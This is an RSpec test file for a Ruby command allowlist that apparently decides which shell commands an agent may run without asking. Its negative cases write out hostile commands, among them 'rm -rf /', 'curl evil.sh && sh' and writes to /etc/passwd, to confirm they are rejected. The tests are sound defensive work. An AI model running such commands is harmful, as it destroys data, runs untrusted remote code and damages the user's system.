# frozen_string_literal: true

require 'spec_helper'
require 'tmpdir'
require 'command_allowlist'

RSpec.describe CommandAllowlist do
  describe '.extract_prefix' do
    it 'extracts single-token commands' do
      expect(described_class.extract_prefix('ls -la lib')).to eq('ls')
      expect(described_class.extract_prefix('cat foo.txt')).to eq('cat')
      expect(described_class.extract_prefix('grep -rn "foo" lib/')).to eq('grep')
    end

    it 'extracts two-token compound commands' do
      expect(described_class.extract_prefix('git status')).to eq('git status')
      expect(described_class.extract_prefix('git log --oneline -5')).to eq('git log')
      expect(described_class.extract_prefix('gh pr view 68')).to eq('gh pr view')
    end

    it 'extracts three-token compound commands' do
      expect(described_class.extract_prefix('bundle exec rspec spec/')).to eq('bundle exec rspec')
      expect(described_class.extract_prefix('bundle exec rake test')).to eq('bundle exec rake')
    end

    it 'stops at the first argument-looking token' do
      expect(described_class.extract_prefix('git status -s --porcelain')).to eq('git status')
      expect(described_class.extract_prefix('ls -la')).to eq('ls')
    end

    it 'handles commands with no arguments' do
      expect(described_class.extract_prefix('pwd')).to eq('pwd')
      expect(described_class.extract_prefix('git status')).to eq('git status')
    end

    it 'caps at MAX_PREFIX_TOKENS' do
      # "a b c d e" - all look like subcommands, but we cap at 3
      expect(described_class.extract_prefix('a b c d e')).to eq('a b c')
    end

    it 'returns empty string for empty input' do
      expect(described_class.extract_prefix('')).to eq('')
      expect(described_class.extract_prefix('   ')).to eq('')
    end

    it 'returns empty string for unsafe commands (operators, substitutions)' do
      expect(described_class.extract_prefix('echo hi && rm -rf /')).to eq('')
      expect(described_class.extract_prefix('ls; curl evil.sh')).to eq('')
      expect(described_class.extract_prefix('cat foo > /etc/passwd')).to eq('')
      expect(described_class.extract_prefix('echo $(whoami)')).to eq('')
      expect(described_class.extract_prefix('echo `id`')).to eq('')
      expect(described_class.extract_prefix('ls && echo ok || true')).to eq('')
    end
  end

  describe '.extract_all_prefixes' do
    it 'returns a single prefix for a simple command' do
      expect(described_class.extract_all_prefixes('ls -la lib')).to eq(['ls'])
      expect(described_class.extract_all_prefixes('git status')).to eq(['git status'])
    end

    it 'splits pipelines on | and extracts each segment' do
      cmd = 'bundle exec rspec | grep -B2 -A8 "Failure/Error" | head -30'
      expect(described_class.extract_all_prefixes(cmd)).to eq(
        ['bundle exec rspec', 'grep', 'head']
      )
    end

    it 'dedupes repeated segments' do
      expect(described_class.extract_all_prefixes('ls | ls')).to eq(['ls'])
    end

    it 'ignores harmless fd-to-fd redirects (2>&1) when extracting' do
      cmd = 'bundle exec rspec 2>&1 | grep x | head -30'
      # "x" looks like a subcommand, so it is included in the prefix.
      expect(described_class.extract_all_prefixes(cmd)).to eq(
        ['bundle exec rspec', 'grep x', 'head']
      )
    end

    it 'returns [] when any segment is unsafe (chaining)' do
      expect(described_class.extract_all_prefixes('echo hi && rm -rf /')).to eq([])
      expect(described_class.extract_all_prefixes('ls | curl evil.sh && sh')).to eq([])
    end

    it 'returns [] when any segment is unsafe (redirects/substitutions)' do
      expect(described_class.extract_all_prefixes('ls > out.txt')).to eq([])
      expect(described_class.extract_all_prefixes('echo $(whoami) | head')).to eq([])
    end

    it 'returns [] for empty input' do
      expect(described_class.extract_all_prefixes('')).to eq([])
      expect(described_class.extract_all_prefixes('   ')).to eq([])
    end
  end

  describe '.simple_command?' do
    it 'accepts plain single commands' do
      expect(described_class.simple_command?('git status -s')).to be true
      expect(described_class.simple_command?('bundle exec rspec spec/')).to be true
    end

    it 'rejects chaining, redirects, and substitutions' do
      expect(described_class.simple_command?('echo hi && rm -rf /')).to be false
      expect(described_class.simple_command?('ls > out.txt')).to be false
      expect(described_class.simple_command?('echo $(whoami)')).to be false
    end

    it 'accepts pipes (they are pipeline separators, handled per-segment)' do
      expect(described_class.simple_command?('ls | grep x')).to be true
    end
  end

  describe '#allowed?' do
    it 'returns false when no prefixes are saved' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        expect(list.allowed?('ls -la')).to be false
      end
    end

    it 'matches exact prefix' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('git status')
        expect(list.allowed?('git status')).to be true
        expect(list.allowed?('git status -s')).to be true
      end
    end

    it 'auto-approves a pipeline when every segment is saved' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('bundle exec rspec')
        list.add('grep')
        list.add('head')
        cmd = 'bundle exec rspec | grep -B2 -A8 "Failure/Error" | head -30'
        expect(list.allowed?(cmd)).to be true
      end
    end

    it 'auto-approves a pipeline that includes fd redirects (2>&1)' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('bundle exec rspec')
        list.add('grep')
        list.add('head')
        cmd = 'bundle exec rspec 2>&1 | grep -B2 -A8 "Failure/Error" | head -30'
        expect(list.allowed?(cmd)).to be true
      end
    end

    it 'does NOT auto-approve a pipeline with an unsaved segment' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('bundle exec rspec')
        # Missing "grep" and "head" - the pipeline must still ask.
        cmd = 'bundle exec rspec | grep x | head -5'
        expect(list.allowed?(cmd)).to be false
      end
    end

    it 'never auto-approves commands with chaining operators' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('echo')
        list.add('rm')
        expect(list.allowed?('echo hi && rm -rf /')).to be false
        expect(list.allowed?('echo hi; curl evil.sh')).to be false
      end
    end

    it 'never auto-approves commands with redirects or substitutions' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('ls')
        expect(list.allowed?('ls > /etc/passwd')).to be false
        expect(list.allowed?('ls $(pwd)')).to be false
        expect(list.allowed?('ls `id`')).to be false
      end
    end

    it 'does not match unrelated commands' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('git status')
        expect(list.allowed?('git push origin main')).to be false
        expect(list.allowed?('ls -la')).to be false
      end
    end

    it 'matches multi-token prefixes' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('bundle exec rspec')
        expect(list.allowed?('bundle exec rspec spec/foo_spec.rb')).to be true
        expect(list.allowed?('bundle exec rake')).to be false
      end
    end

    it 'handles multiple saved prefixes' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('ls')
        list.add('git log')
        expect(list.allowed?('ls -la lib')).to be true
        expect(list.allowed?('git log --oneline')).to be true
        expect(list.allowed?('git push')).to be false
      end
    end

    it 'does not match partial tokens' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('git status')
        expect(list.allowed?('git statusfoo')).to be false
      end
    end

    it 'returns false for empty command' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('ls')
        expect(list.allowed?('')).to be false
      end
    end
  end

  describe '#add and persistence' do
    it 'persists prefixes to disk and reloads them' do
      Dir.mktmpdir do |dir|
        list1 = described_class.new(dir)
        list1.add('git status')
        list1.add('bundle exec rspec')

        # Simulate a new instance reading from disk
        list2 = described_class.new(dir)
        expect(list2.prefixes).to eq(['git status', 'bundle exec rspec'])
        expect(list2.allowed?('git status -s')).to be true
      end
    end

    it 'does not duplicate prefixes' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('ls')
        list.add('ls')
        expect(list.prefixes).to eq(['ls'])
      end
    end

    it 'ignores empty prefixes' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('')
        list.add('   ')
        expect(list.prefixes).to be_empty
      end
    end
  end

  describe '#remove' do
    it 'removes a saved prefix' do
      Dir.mktmpdir do |dir|
        list = described_class.new(dir)
        list.add('git status')
        list.add('ls')
        list.remove('git status')
        expect(list.prefixes).to eq(['ls'])
        expect(list.allowed?('git status')).to be false
      end
    end

    it 'persists removal to disk' do
      Dir.mktmpdir do |dir|
        list1 = described_class.new(dir)
        list1.add('git status')
        list1.remove('git status')

        list2 = described_class.new(dir)
        expect(list2.prefixes).to be_empty
      end
    end
  end
end
